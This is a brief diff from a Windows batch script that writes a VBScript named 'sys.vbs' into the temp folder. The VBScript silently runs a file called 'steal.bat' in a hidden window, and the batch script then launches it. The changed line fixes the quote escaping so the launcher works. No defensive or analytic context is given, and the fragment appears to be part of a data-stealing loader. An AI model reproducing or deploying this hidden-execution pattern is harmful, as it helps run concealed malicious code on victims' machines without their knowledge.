@@ -4,7 +4,7 @@ goto Cvbs
 
 :Cvbs
 echo Set objShell = CreateObject("WScript.Shell")>"%temp%\sys.vbs"
-echo objShell.Run "cmd.exe /c ^"%temp%\steal.bat^"", 0, True >>"%temp%\sys.vbs"
+echo objShell.Run "cmd.exe /c ""%temp%\steal.bat""", 0, True >>"%temp%\sys.vbs"
 wscript.exe //nologo "%temp%\sys.vbs"
 exit
 
